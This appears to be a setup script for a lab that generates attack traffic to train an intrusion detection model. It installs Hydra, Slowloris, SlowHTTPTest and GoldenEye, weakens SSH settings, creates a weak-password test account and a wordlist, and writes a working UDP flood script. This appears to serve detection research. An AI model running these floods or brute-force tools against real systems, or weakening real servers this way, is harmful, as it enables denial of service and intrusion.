# === STEP 1: System update + build tools ===
sudo yum update -y
sudo yum install -y gcc make openssl-devel libssh-devel gcc-c++ python3 python3-pip git nmap httpd-tools tcpdump nginx vsftpd

# === STEP 2: Virtual environment (untuk semua pip packages) ===
sudo python3 -m venv /opt/venv
sudo /opt/venv/bin/pip install --upgrade pip
sudo /opt/venv/bin/pip install slowloris cicflowmeter xgboost scikit-learn pandas numpy boto3

# === STEP 3: Hydra (compile from source) ===
cd /tmp
curl -sL -o hydra.tar.gz https://github.com/vanhauser-thc/thc-hydra/archive/refs/tags/v9.5.tar.gz
tar xzf hydra.tar.gz && cd thc-hydra-9.5
./configure && make && sudo make install

# === STEP 4: SlowHTTPTest (compile from source) ===
cd /tmp
curl -sL -o slowhttp.tar.gz https://github.com/shekyan/slowhttptest/archive/refs/tags/v1.9.0.tar.gz
tar xzf slowhttp.tar.gz && cd slowhttptest-1.9.0
./configure && make && sudo make install

# === STEP 5: GoldenEye ===
sudo git clone https://github.com/jseidl/GoldenEye.git /opt/GoldenEye

# === STEP 6: Target services ===
sudo useradd -m testuser && echo "testuser:P@ssw0rd123" | sudo chpasswd
sudo sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#MaxAuthTries.*/MaxAuthTries 100/' /etc/ssh/sshd_config
sudo systemctl restart sshd
sudo systemctl enable nginx && sudo systemctl start nginx
sudo systemctl enable vsftpd && sudo systemctl start vsftpd

# === STEP 7: Folders + password list ===
sudo mkdir -p /opt/ids2018/{models,flows,results,logs,schedule}
sudo mkdir -p /opt/attack
echo -e "admin\nroot\npassword\n123456\ntest\ntestuser\nP@ssw0rd123\nletmein\nqwerty\nabc123" | sudo tee /opt/attack/passwords.txt

# === STEP 8: UDP flood script ===
sudo tee /opt/attack/udp_flood.py << 'EOF'
#!/usr/bin/env python3
import socket, sys, time, random
target = sys.argv[1]
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
end_time = time.time() + duration
count = 0
while time.time() < end_time:
    sock.sendto(random._urandom(1024), (target, port))
    count += 1
print(f"Sent {count} UDP packets in {duration}s")
EOF
sudo chmod +x /opt/attack/udp_flood.py

# === STEP 9: Verify ===
echo "=== VERIFY ==="
which hydra && echo "✓ Hydra OK"
which nmap && echo "✓ Nmap OK"
which slowhttptest && echo "✓ SlowHTTPTest OK"
which ab && echo "✓ ApacheBench OK"
which tcpdump && echo "✓ tcpdump OK"
/opt/venv/bin/slowloris --help 2>&1 | head -1 && echo "✓ Slowloris OK"
/opt/venv/bin/cicflowmeter --help 2>&1 | head -1 && echo "✓ CICFlowMeter OK"
ls /opt/GoldenEye/goldeneye.py && echo "✓ GoldenEye OK"
systemctl status sshd --no-pager | head -3
systemctl status nginx --no-pager | head -3
echo "=== ALL DONE ==="


# 1. Buat struktur folder yang dibutuhkan di bawah /opt/ids2018/
sudo mkdir -p /opt/ids2018/models/ /opt/ids2018/schedule/

# 2. Ubah kepemilikan folder /opt/ids2018 agar bisa diakses user Anda saat ini
sudo chown -R $USER:$USER /opt/ids2018/

# 3. Jalankan ulang perintah AWS S3 sync & cp Anda (tanpa perlu sudo)
aws s3 sync s3://ssh-detection-features-232032302717/models/ids2018/deploy/ /opt/ids2018/models/
aws s3 cp s3://ssh-detection-features-232032302717/scripts/inference.py /opt/ids2018/inference.py
aws s3 cp s3://ssh-detection-features-232032302717/ids2018/schedule/schedule.json /opt/ids2018/schedule/schedule.json

# 4. Cek kembali hasilnya
ls -lh /opt/ids2018/models/ /opt/ids2018/inference.py /opt/ids2018/schedule/schedule.json
